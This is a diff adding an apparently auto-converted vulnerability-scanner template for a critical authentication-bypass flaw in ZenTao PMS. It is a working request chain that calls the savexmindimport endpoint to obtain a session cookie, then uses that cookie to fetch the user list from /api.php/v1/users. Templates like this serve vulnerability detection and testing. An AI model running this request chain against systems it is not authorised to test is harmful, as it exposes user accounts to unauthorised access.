@@ -1,0 +1,22 @@
+id: yaml-poc-easycorp-zentao-pms-idor-CT-1222946
+info:
+  name: Yaml Poc Easycorp Zentao Pms Idor Ct 1222946
+  author: yuxiang.cai
+  severity: critical
+  description: 'Converted from xpoc: yaml-poc-easycorp-zentao-pms-idor-CT-1222946'
+  tags: xpoc
+  reference: []
+http:
+- method: GET
+  path:
+  - '{{value}}/api.php?m=testcase&f=savexmindimport&HTTP_X_REQUESTED_WITH=XMLHttpRequest&productID={{random_str_0}}&branch={{random_str_1}}'
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+- method: GET
+  path:
+  - '{{value}}/api.php/v1/users'
+  headers:
+    Cookie: zentaosid={{cookie}}
